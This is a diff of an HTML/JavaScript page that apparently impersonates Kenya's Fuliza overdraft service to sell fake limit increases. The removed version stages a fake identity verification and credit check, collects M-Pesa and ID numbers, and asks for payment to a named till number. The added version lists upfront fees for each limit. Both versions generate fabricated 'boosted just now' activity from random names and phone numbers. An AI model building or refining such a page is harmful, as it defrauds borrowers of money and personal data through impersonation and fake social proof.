@@ -1,410 +1,174 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Fuliza Boost</title>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>FulizaBoost</title>
 
 <style>
-body{
-  margin:0;
-  font-family:sans-serif;
-  background:linear-gradient(to bottom,#eef2f7,#fff);
+body {
+  margin: 0;
+  font-family: Arial, sans-serif;
+  background: #f5f6f7;
 }
 
-/* HIDE */
-.hidden{display:none}
-
-/* CENTER */
-.center-screen{
-  display:flex;
-  justify-content:center;
-  align-items:center;
-  height:100vh;
+.container {
+  max-width: 400px;
+  margin: auto;
+  padding: 20px;
 }
 
-/* CARD */
-.card{
-  background:#fff;
-  width:90%;
-  max-width:350px;
-  padding:30px;
-  border-radius:25px;
-  text-align:center;
-  box-shadow:0 10px 30px rgba(0,0,0,0.1);
+.title {
+  text-align: center;
+  font-size: 28px;
+  font-weight: bold;
 }
 
-/* INPUT */
-.input{
-  width:100%;
-  padding:14px;
-  border-radius:12px;
-  border:1px solid #ddd;
-  margin:15px 0;
+.subtitle {
+  text-align: center;
+  color: gray;
+  margin-bottom: 15px;
 }
 
-/* BUTTON */
-button{
-  width:100%;
-  padding:15px;
-  border:none;
-  border-radius:12px;
-  font-size:16px;
+.live {
+  background: #eef1f4;
+  padding: 10px;
+  border-radius: 10px;
+  font-size: 14px;
+  margin-bottom: 20px;
 }
 
-.green-btn{
-  background:#16a34a;
-  color:#fff;
+.grid {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 12px;
 }
 
-/* ICON CIRCLE */
-.icon-circle{
-  width:90px;
-  height:90px;
-  background:#e6f4ea;
-  border-radius:50%;
-  margin:0 auto 15px;
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  font-size:30px;
-  color:#16a34a;
+.card {
+  background: #fff;
+  padding: 15px;
+  border-radius: 12px;
+  text-align: center;
+  box-shadow: 0 2px 6px rgba(0,0,0,0.1);
+  cursor: pointer;
+  border: 2px solid transparent;
 }
 
-/* LOADING */
-.spinner{
-  width:60px;
-  height:60px;
-  border:5px solid #e6f4ea;
-  border-top:5px solid #16a34a;
-  border-radius:50%;
-  margin:0 auto 20px;
-  animation:spin 1s linear infinite;
+.card.active {
+  border: 2px solid green;
+  background: #eaffea;
 }
 
-@keyframes spin{
-  100%{transform:rotate(360deg)}
+.amount {
+  color: green;
+  font-weight: bold;
+  font-size: 18px;
 }
 
-/* SUCCESS */
-.check{
-  width:80px;
-  height:80px;
-  background:#16a34a;
-  color:#fff;
-  border-radius:50%;
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  font-size:30px;
-  margin:0 auto 20px;
+.fee {
+  color: gray;
+  font-size: 13px;
 }
 
-/* LIMITS */
-.container{
-  padding:20px;
+.button {
+  margin-top: 20px;
+  width: 100%;
+  padding: 15px;
+  background: green;
+  color: white;
+  border: none;
+  border-radius: 12px;
+  font-size: 16px;
+  font-weight: bold;
 }
 
-.grid{
-  display:grid;
-  grid-template-columns:1fr 1fr;
-  gap:12px;
-}
-
-.box{
-  background:#fff;
-  padding:20px;
-  border-radius:15px;
-  text-align:center;
-  border:2px solid transparent;
-  cursor:pointer;
-}
-
-.box.active{
-  border:2px solid #16a34a;
-  background:#e6f4ea;
-}
-
-/* LIVE ACTIVITY */
-.live{
-  background:#f1f5f9;
-  padding:12px;
-  border-radius:12px;
-  margin-bottom:15px;
-  font-size:13px;
-  color:#16a34a;
-  font-weight:500;
-}
-
-/* UPGRADE BTN */
-#upgradeBtn{
-  margin-top:20px;
-  background:#16a34a;
-  color:#fff;
-  opacity:0.5;
-}
-
-#upgradeBtn.active{
-  opacity:1;
-}
-
-/* MODAL */
-.modal{
-  position:fixed;
-  top:0;
-  left:0;
-  width:100%;
-  height:100%;
-  background:rgba(0,0,0,0.4);
-  display:flex;
-  align-items:center;
-  justify-content:center;
-}
-
-.modal-card{
-  width:90%;
-  max-width:350px;
-  background:#fff;
-  border-radius:20px;
-  overflow:hidden;
-}
-
-.modal-header{
-  background:#22c55e;
-  color:#fff;
-  padding:20px;
-}
-
-.modal-body{
-  padding:20px;
-}
-
-.info{
-  background:#e6f4ea;
-  padding:12px;
-  border-radius:10px;
-  font-size:13px;
-  margin-bottom:10px;
-}
-
-.row{
-  display:flex;
-  gap:10px;
-}
-
-.cancel{
-  background:#eee;
-}
-
-.pay{
-  background:#22c55e;
-  color:#fff;
+.help {
+  text-align: center;
+  color: green;
+  margin-top: 10px;
+  font-size: 14px;
 }
 </style>
 </head>
 
 <body>
 
-<!-- STEP 1 -->
-<div id="step1" class="center-screen">
-  <div class="card">
+<div class="container">
 
-    <div class="icon-circle">👤</div>
+  <div class="title">FulizaBoost</div>
+  <div class="subtitle">Instant Limit Increase • Same Day Access</div>
 
-    <h2>Fuliza Plus+</h2>
-    <p style="color:#16a34a;font-size:13px;">OFFICIAL VERIFICATION PORTAL</p>
-
-    <p>Verify your identity to unlock higher daily transaction limits.</p>
-
-    <input id="phone" class="input" placeholder="Enter M-Pesa Number">
-
-    <button class="green-btn" onclick="startProcess()">
-      Check My Eligibility
-    </button>
-
-    <p style="font-size:12px;margin-top:10px;color:#888;">
-      ● 136 USERS ONLINE | 🔒 SSL SECURED
-    </p>
-
+  <div class="live" id="liveText">
+    Loading activity...
   </div>
-</div>
-
-<!-- STEP 2 -->
-<div id="step2" class="center-screen hidden">
-  <div class="card">
-    <div class="spinner"></div>
-    <h2 id="loadingText">Connecting...</h2>
-    <p>Accessing secure databases...</p>
-  </div>
-</div>
-
-<!-- STEP 3 (SUCCESS) -->
-<div id="step3" class="center-screen hidden">
-  <div class="card">
-    <div class="check">✔</div>
-    <h2>Congratulations!</h2>
-    <p>High Trust Score Detected. <b id="userNumber"></b></p>
-
-    <button class="green-btn" onclick="showLimits()">
-      Proceed to Upgrade Limit
-    </button>
-  </div>
-</div>
-
-<!-- LIMITS -->
-<div id="limits" class="container hidden">
-
-  <div id="liveActivity" class="live"></div>
 
   <h3>Select Your New Approved Limit</h3>
 
-  <div class="grid">
-    <div class="box" data-amount="3000">Ksh 3,000</div>
-    <div class="box" data-amount="5000">Ksh 5,000</div>
-    <div class="box" data-amount="7500">Ksh 7,500</div>
-    <div class="box" data-amount="10000">Ksh 10,000</div>
-    <div class="box" data-amount="12500">Ksh 12,500</div>
-    <div class="box" data-amount="16000">Ksh 16,000</div>
-    <div class="box" data-amount="21000">Ksh 21,000</div>
-    <div class="box" data-amount="25500">Ksh 25,500</div>
-    <div class="box" data-amount="30000">Ksh 30,000</div>
-    <div class="box" data-amount="35000">Ksh 35,000</div>
-    <div class="box" data-amount="45000">Ksh 45,000</div>
-    <div class="box" data-amount="60000">Ksh 60,000</div>
-    <div class="box" data-amount="70000">Ksh 70,000</div>
-  </div>
+  <div class="grid" id="grid"></div>
 
-  <button id="upgradeBtn" onclick="upgrade()" disabled>
+  <button class="button" id="upgradeBtn">
     ⚡ UPGRADE
   </button>
 
-</div>
+  <div class="help">Need help? Chat with Support</div>
 
-<!-- MODAL -->
-<div id="modal" class="modal hidden">
-  <div class="modal-card">
-
-    <div class="modal-header">
-      <small>SECURE FULIZA APPLICATION</small>
-      <h3 id="modalTitle"></h3>
-    </div>
-
-    <div class="modal-body">
-
-      <div class="info">
-        Pay to Till Number <b>6363781</b> to proceed.
-      </div>
-
-      <input class="input" placeholder="ID Number">
-      <input id="modalPhone" class="input">
-
-      <div class="row">
-        <button class="cancel" onclick="closeModal()">Cancel</button>
-        <button class="pay" id="payBtn">Pay</button>
-      </div>
-
-    </div>
-
-  </div>
 </div>
 
 <script>
+const limits = [
+  {amount:3000, fee:250},
+  {amount:5000, fee:293},
+  {amount:7500, fee:350},
+  {amount:10000, fee:500},
+  {amount:12500, fee:747},
+  {amount:16000, fee:898},
+  {amount:21000, fee:1015},
+  {amount:25500, fee:1220},
+  {amount:30000, fee:1533},
+  {amount:35000, fee:1730},
+  {amount:45000, fee:2000},
+  {amount:60000, fee:2250},
+  {amount:70000, fee:2500}
+];
 
-/* STEP FLOW */
-function startProcess(){
-  let phone=document.getElementById("phone").value;
-  if(!phone) return alert("Enter phone number");
+let selected = null;
+const grid = document.getElementById("grid");
 
-  document.getElementById("step1").classList.add("hidden");
-  document.getElementById("step2").classList.remove("hidden");
+limits.forEach(item => {
+  const div = document.createElement("div");
+  div.className = "card";
+  div.innerHTML = `
+    <div class="amount">Ksh ${item.amount.toLocaleString()}</div>
+    <div class="fee">Fee: KSH ${item.fee}</div>
+  `;
 
-  let steps=[
-    "Connecting...",
-    "Checking Usage History...",
-    "Verifying CRB Status...",
-    "Finalizing Trust Score..."
-  ];
+  div.onclick = () => {
+    document.querySelectorAll(".card").forEach(c => c.classList.remove("active"));
+    div.classList.add("active");
+    selected = item;
 
-  let i=0;
+    document.getElementById("upgradeBtn").innerText =
+      "⚡ UPGRADE TO KSH " + item.amount.toLocaleString();
+  };
 
-  let interval=setInterval(()=>{
-    document.getElementById("loadingText").innerText=steps[i];
-    i++;
-
-    if(i===steps.length){
-      clearInterval(interval);
-
-      setTimeout(()=>{
-        document.getElementById("step2").classList.add("hidden");
-        document.getElementById("step3").classList.remove("hidden");
-        document.getElementById("userNumber").innerText=phone;
-      },1000);
-    }
-  },2000);
-}
-
-function showLimits(){
-  document.getElementById("step3").classList.add("hidden");
-  document.getElementById("limits").classList.remove("hidden");
-}
-
-/* LIVE ACTIVITY */
-let names=["Brian O.","Mercy W.","Kevin K.","Alice M.","David N."];
-let amounts=[3000,5000,7500,10000,21000,45000,70000];
-
-function randomPhone(){
-  return "07"+Math.floor(100+Math.random()*900)+"****"+Math.floor(10+Math.random()*90);
-}
-
-function generateActivity(){
-  let name=names[Math.floor(Math.random()*names.length)];
-  let amount=amounts[Math.floor(Math.random()*amounts.length)];
-  let phone=randomPhone();
-
-  return `${name} (${phone}) boosted to Ksh ${amount.toLocaleString()} just now`;
-}
-
-setInterval(()=>{
-  document.getElementById("liveActivity").innerText=generateActivity();
-},2000);
-
-/* SELECT */
-let selectedAmount="";
-let boxes=document.querySelectorAll(".box");
-
-boxes.forEach(box=>{
-  box.onclick=()=>{
-    boxes.forEach(b=>b.classList.remove("active"));
-    box.classList.add("active");
-
-    selectedAmount=box.dataset.amount;
-
-    let btn=document.getElementById("upgradeBtn");
-    btn.disabled=false;
-    btn.classList.add("active");
-
-    btn.innerText="⚡ UPGRADE TO KSH "+Number(selectedAmount).toLocaleString();
-  }
+  grid.appendChild(div);
 });
 
-/* MODAL */
-function upgrade(){
-  document.getElementById("modalTitle").innerText=
-   "Limit will be boosted to Ksh "+Number(selectedAmount).toLocaleString();
+// LIVE ACTIVITY
+const names = ["Brian M.", "Kevin K.", "Jane N.", "Alex P.", "Faith W."];
+const phones = ["0712****111", "0704****709", "0798****555"];
 
-  document.getElementById("payBtn").innerText=
-   "Pay Ksh "+Math.floor(selectedAmount*0.05);
+function updateLive() {
+  const name = names[Math.floor(Math.random() * names.length)];
+  const phone = phones[Math.floor(Math.random() * phones.length)];
+  const amount = limits[Math.floor(Math.random() * limits.length)].amount;
 
-  document.getElementById("modalPhone").value=
-   document.getElementById("phone").value;
-
-  document.getElementById("modal").classList.remove("hidden");
+  document.getElementById("liveText").innerText =
+    `${name} (${phone}) boosted to Ksh ${amount.toLocaleString()} just now`;
 }
 
-function closeModal(){
-  document.getElementById("modal").classList.add("hidden");
-}
-
+setInterval(updateLive, 3000);
+updateLive();
 </script>
 
 </body>
